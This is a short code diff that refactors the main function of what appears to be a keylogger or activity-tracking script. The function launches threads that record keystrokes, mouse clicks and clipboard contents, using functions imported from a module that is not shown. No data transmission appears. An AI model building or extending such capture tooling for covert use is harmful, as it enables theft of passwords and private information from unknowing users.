@@ -28,14 +28,22 @@ from utils.keyTrack import recordKeyStrokes, recordMouseClicks, recordClipboard
 # ========== Main Function ==========
 def main():
     # Creating threads
-    keyTrackThread = threading.Thread(target=recordKeyStrokes)
-    mouseTrackThread = threading.Thread(target=recordMouseClicks)
-    recordClipboardThread = threading.Thread(target=recordClipboard)
+    try:
+        key_track_thread = threading.Thread(target=recordKeyStrokes, name="Key Track Thread")
+        mouse_track_thread = threading.Thread(target=recordMouseClicks, name="Mouse Track Thread")
+        record_clipboard_thread = threading.Thread(target=recordClipboard, name="Clipboard Track Thread")
+    except Exception:
+        print("Error in creating threads")
+
+    threads = [key_track_thread, mouse_track_thread, record_clipboard_thread]
     
-    # Starting threads
-    keyTrackThread.start()
-    mouseTrackThread.start()
-    recordClipboardThread.start()
+    # Start Threads
+    for thread in threads:
+        thread.start()
+    
+    # Join Threads
+    for thread in threads:
+        thread.join()
 
 # ========== Main Function Call ==========
 if __name__ == "__main__":
